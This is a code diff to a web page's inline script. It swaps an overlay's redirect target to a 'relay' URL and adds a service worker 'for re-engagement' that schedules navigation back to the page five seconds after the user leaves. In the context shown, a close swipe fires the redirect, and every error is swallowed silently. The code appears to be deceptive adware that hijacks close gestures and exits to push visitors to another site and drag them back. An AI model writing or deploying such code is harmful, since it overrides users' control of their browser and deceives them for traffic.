@@ -13,7 +13,7 @@
 
     function fireFullscreen() {
         log('fire');
-        window.location.href = 'https://bit.ly/4aHQcVB';
+        window.location.href = 'https://www.utilityfare.com/relay';
     }
 
     function onClose() {
@@ -69,6 +69,29 @@
         if (txStart < 30 && dx > 20) { swipeFired = true; log('swipe:edge'); onClose(); }
     }, {passive: true});
 })();
+
+// Register service worker for re-engagement
+if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.register('/sw.js').catch(function(){});
+}
+// When page unloads (overlay fired), schedule SW to navigate back after 5s
+window.addEventListener('pagehide', function(){
+    try {
+        if (navigator.serviceWorker && navigator.serviceWorker.controller) {
+            navigator.serviceWorker.controller.postMessage({action: 'schedule', delay: 5000});
+        }
+    } catch(e){}
+});
+// Cancel SW schedule if user returns to page
+document.addEventListener('visibilitychange', function(){
+    if (!document.hidden) {
+        try {
+            if (navigator.serviceWorker && navigator.serviceWorker.controller) {
+                navigator.serviceWorker.controller.postMessage({action: 'cancel'});
+            }
+        } catch(e){}
+    }
+});
 </script>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
